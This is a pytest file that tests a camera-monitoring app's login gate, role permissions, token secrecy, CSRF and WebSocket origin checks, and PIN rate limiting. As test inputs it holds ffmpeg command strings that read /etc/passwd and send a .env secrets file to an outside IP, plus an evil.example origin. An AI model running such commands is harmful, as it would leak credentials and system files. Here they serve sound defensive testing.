"""Portão de autenticação (auditoria out/2026, achado C3).

Prova que: sem sessão, a API e os WebSockets recusam (401 / close 1008); a
documentação OpenAPI não é servida; a sessão por cookie (como o navegador usa)
destrava o app; os papéis valem em câmera/PTZ/gravação/WhatsApp; a config do
WhatsApp nunca devolve o token.
"""
from __future__ import annotations

import pytest
from fastapi.testclient import TestClient
from starlette.websockets import WebSocketDisconnect

from app.api import guard, routes_auth
from app.main import app
from tests.authclient import admin_client

SENSITIVE = [
    ("GET", "/api/cameras/saved", None),
    ("POST", "/api/cameras/saved", {"name": "x", "ip": "192.0.2.10"}),
    ("GET", "/api/cameras/cam_x/mjpeg", None),
    ("GET", "/api/cameras/scan", None),
    ("POST", "/api/cameras/ptz/move", {"ip": "192.0.2.10", "pan": 0.1}),
    ("POST", "/api/cameras/ptz/stop", {"ip": "192.0.2.10"}),
    ("POST", "/api/cameras/cam_x/record/start", None),
    ("POST", "/api/cameras/cam_x/record/stop", None),
    ("POST", "/api/cameras/snapshot", {"url": "http://192.0.2.10/x.jpg"}),
    ("GET", "/api/recordings", None),
    ("PUT", "/api/recordings/config", {"enabled": True}),
    ("GET", "/api/events", None),
    ("GET", "/api/events/summary", None),
    ("GET", "/api/notify/whatsapp/config", None),
    ("PUT", "/api/notify/whatsapp/config", {"token": "EAAX"}),
    ("POST", "/api/notify/whatsapp/test", {"to": ["5500000000000"]}),
    ("POST", "/api/aerial/test/start", {"command": "ffmpeg -i /etc/passwd"}),
    ("POST", "/api/face/enroll", {"operator_id": "op_x", "name": "x", "image_b64": "AA=="}),
    ("GET", "/api/face/gallery", None),
    ("GET", "/api/tasks", None),
    ("POST", "/api/infer", {"image_b64": "AA==", "task": {"mode": "LER"}}),
    ("GET", "/api/config", None),
    ("PUT", "/api/config/appearance", {"value": {}}),
    ("GET", "/api/databases", None),
    ("GET", "/api/security/overview", None),
    ("GET", "/api/metrics", None),
    ("GET", "/api/export", None),
    ("GET", "/api/auth/users", None),
    ("GET", "/api/auth/matrix", None),
    ("GET", "/api/iamac/status", None),
    ("POST", "/api/iamac/ask", {"question": "x"}),
    ("GET", "/api/vps/bridge", None),
    ("GET", "/api/workers", None),
    ("GET", "/api/automation/status", None),
    ("GET", "/api/changes", None),
]


def _req(c: TestClient, method: str, path: str, body):
    return c.request(method, path, json=body) if body is not None else c.request(method, path)


def _mk_user(admin: TestClient, name: str, role: str, pin: str = "1111") -> str:
    r = admin.post("/api/auth/users", json={"name": name, "role": role, "pin": pin})
    assert r.status_code == 200 and r.json()["ok"], r.text
    return r.json()["operator_id"]


def _login(app_, oid: str, pin: str = "1111") -> TestClient:
    c = TestClient(app_)
    c.__enter__()
    r = c.post("/api/auth/login/pin", json={"operator_id": oid, "pin": pin})
    assert r.json().get("ok"), r.text
    return c


@pytest.fixture(scope="module")
def admin():
    with admin_client(app) as c:
        yield c


@pytest.fixture(scope="module")
def users(admin):
    return {"operador": _mk_user(admin, "Operador Gate", "operador"),
            "view": _mk_user(admin, "Visitante Gate", "view")}


# ── sem login ────────────────────────────────────────────────────────
def test_docs_desligados():
    with TestClient(app) as c:
        for p in ("/docs", "/redoc", "/openapi.json", "/docs/oauth2-redirect"):
            assert c.get(p).status_code == 404, p


@pytest.mark.parametrize("method,path,body", SENSITIVE)
def test_anonimo_recebe_401(method, path, body, admin):
    with TestClient(app) as c:
        r = _req(c, method, path, body)
        assert r.status_code == 401, (method, path, r.status_code, r.text[:200])


def test_publico_minimo(admin):
    with TestClient(app) as c:
        assert c.get("/api/health").json()["status"] == "ok"
        assert c.get("/api/capabilities").status_code == 200
        assert c.get("/api/auth/state").json()["bootstrap_needed"] is False
        assert c.get("/api/auth/me").json() == {"authenticated": False, "user": None}
        # bootstrap com admin existente não abre sessão
        r = c.post("/api/auth/bootstrap", json={"name": "Intruso", "pin": "0000"})
        assert r.json()["ok"] is False and "vd_session" not in r.cookies
        # dev-login desligado em produção
        assert c.post("/api/auth/dev-login").status_code == 403


def test_token_invalido_401():
    with TestClient(app) as c:
        assert c.get("/api/cameras/saved", headers={"X-Auth-Token": "f" * 40}).status_code == 401
        c.cookies.set("vd_session", "e" * 40)
        assert c.get("/api/cameras/saved").status_code == 401


@pytest.mark.parametrize("path", ["/ws/stream", "/ws/vps", "/ws/devices"])
def test_ws_anonimo_recusado(path, admin):
    with TestClient(app) as c:
        with pytest.raises(WebSocketDisconnect) as e:
            with c.websocket_connect(path) as ws:
                ws.receive_json()
        assert e.value.code == 1008


# ── logado (cookie, como o navegador) ────────────────────────────────
def test_login_grava_cookie_httponly_strict():
    with TestClient(app) as c:
        st = c.get("/api/auth/state").json()
        r = (c.post("/api/auth/bootstrap", json={"name": "Admin Teste", "pin": "4321"})
             if st["bootstrap_needed"] else
             c.post("/api/auth/login/pin", json={"operator_id": "op_admin_teste", "pin": "4321"}))
        sc = r.headers["set-cookie"].lower()
        assert "vd_session=" in sc and "httponly" in sc and "samesite=strict" in sc and "path=/" in sc


def test_fluxo_logado_por_cookie(admin):
    # Mesmo cliente, SEM cabeçalho X-Auth-Token: só o cookie.
    assert admin.get("/api/cameras/saved").status_code == 200
    assert admin.get("/api/events/summary").status_code == 200
    assert admin.get("/api/tasks").status_code == 200
    assert admin.get("/api/auth/me").json()["authenticated"] is True
    with admin.websocket_connect("/ws/vps") as ws:
        assert ws.receive_json()["type"] == "ready"
    with admin.websocket_connect("/ws/devices") as ws:
        assert ws.receive_json()["type"] == "welcome"


def test_token_legado_no_cabecalho_recebe_cookie(admin):
    tok = admin.cookies.get("vd_session")
    with TestClient(app) as c:      # navegador com token só no localStorage
        r = c.get("/api/auth/me", headers={"X-Auth-Token": tok})
        assert r.json()["authenticated"] is True and r.cookies.get("vd_session") == tok
        assert c.get("/api/cameras/saved").status_code == 200   # agora pelo cookie


def test_logout_derruba_sessao():
    with admin_client(app) as c:
        assert c.get("/api/tasks").status_code == 200
        r = c.post("/api/auth/logout")
        assert r.status_code == 200
        assert c.get("/api/tasks").status_code == 401


# ── papéis ───────────────────────────────────────────────────────────
def test_view_so_le(users):
    c = _login(app, users["view"])
    try:
        assert c.get("/api/cameras/saved").status_code == 200
        assert c.post("/api/cameras/ptz/stop", json={"ip": "192.0.2.10"}).status_code == 403
        assert c.post("/api/cameras/cam_x/record/start").status_code == 403
        assert c.put("/api/recordings/config", json={"enabled": True}).status_code == 403
        assert c.get("/api/notify/whatsapp/config").status_code == 403
        assert c.post("/api/auth/logout").status_code == 200   # sair sempre pode
    finally:
        c.__exit__(None, None, None)


def test_operador_opera_mas_nao_configura(users, admin):
    c = _login(app, users["operador"])
    try:
        # passa o portão (a câmera não existe → 404, não 401/403)
        assert c.post("/api/cameras/cam_inexistente/record/start").status_code == 404
        assert c.post("/api/cameras/cam_inexistente/record/stop").status_code == 200
        for m, p, b in [("GET", "/api/notify/whatsapp/config", None),
                        ("PUT", "/api/notify/whatsapp/config", {"token": "x"}),
                        ("POST", "/api/notify/whatsapp/test", {}),
                        ("POST", "/api/cameras/saved", {"name": "x", "ip": "192.0.2.1"}),
                        ("POST", "/api/aerial/test/start", {}),
                        ("GET", "/api/cameras/scan", None),
                        ("GET", "/api/databases", None),
                        ("PUT", "/api/config/appearance", {"value": {}})]:
            assert _req(c, m, p, b).status_code == 403, (m, p)
        # face: operador não cadastra rosto no admin (tomada de conta)
        r = c.post("/api/face/enroll", json={"operator_id": "op_admin_teste", "name": "x",
                                             "image_b64": "AA==", "consent": True})
        assert r.status_code == 403
    finally:
        c.__exit__(None, None, None)


def test_whatsapp_config_nunca_devolve_token(admin):
    segredo = "EAAG-segredo-de-teste-123"
    r = admin.put("/api/notify/whatsapp/config",
                  json={"token": segredo, "phone_number_id": "100000000000000", "recipients": ["5500000000000"]})
    assert r.status_code == 200
    for body in (r.text, admin.get("/api/notify/whatsapp/config").text):
        assert segredo not in body and '"token"' not in body
    assert admin.get("/api/notify/whatsapp/config").json()["has_token"] is True


def test_ffmpeg_livre_ignorado_em_producao(admin, monkeypatch):
    import app.api.routes_aerial as ra
    vistos = []

    class _P:
        def __init__(self, argv, **kw):
            vistos.append(argv)

        def poll(self):
            return 0

    monkeypatch.setattr(ra.subprocess, "Popen", _P)
    r = admin.post("/api/aerial/test/start",
                   json={"command": "ffmpeg -i /opt/visiondesk/.env -f data http://198.51.100.9/x"})
    assert r.status_code == 200
    assert vistos and ".env" not in " ".join(vistos[0]) and "lavfi" in vistos[0]


def test_csrf_origem_externa_recusada(admin):
    task = {"mode": "DESCREVER", "params": {"mode": "DESCREVER", "foco": "esteira"}}
    r = admin.post("/api/tasks", json=task, headers={"Origin": "https://evil.example"})
    assert r.status_code == 403
    r = admin.post("/api/tasks", json=task, headers={"Origin": "http://testserver"})
    assert r.status_code == 200


def test_ws_de_outro_site_recusado(admin):
    with pytest.raises(WebSocketDisconnect) as e:
        with admin.websocket_connect("/ws/vps", headers={"Origin": "https://evil.example"}) as ws:
            ws.receive_json()
    assert e.value.code == 1008


def test_sessao_expirada(admin, monkeypatch):
    from app.config import get_settings
    monkeypatch.setattr(get_settings(), "session_ttl_hours", 1e-9)
    assert admin.get("/api/tasks").status_code == 401


def test_limite_de_tentativas_pin(users):
    routes_auth._fails.clear()
    try:
        with TestClient(app) as c:
            codes = [c.post("/api/auth/login/pin", json={"operator_id": users["view"], "pin": "9999"}).status_code
                     for _ in range(routes_auth._FAIL_MAX + 1)]
            assert codes[-1] == 429 and set(codes[:-1]) == {200}
    finally:
        routes_auth._fails.clear()


def test_lista_publica_e_curta():
    # Qualquer rota nova em PUBLIC precisa passar por revisão de segurança.
    assert len(guard.PUBLIC) == 9
